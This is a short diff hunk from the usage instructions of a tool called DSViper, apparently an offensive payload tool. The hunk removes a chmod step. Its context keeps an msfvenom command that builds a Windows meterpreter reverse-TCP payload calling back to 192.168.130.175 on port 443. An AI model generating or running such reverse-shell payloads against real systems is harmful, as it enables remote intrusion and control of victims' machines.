@@ -38,7 +38,6 @@ chmod +x install_dependencies.sh
 Make the `DSViper` executable and run it:
 
 ```bash
-chmod +x DSViper
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.130.175 LPORT=443 -f raw > payload.bin
 ./DSViper
 
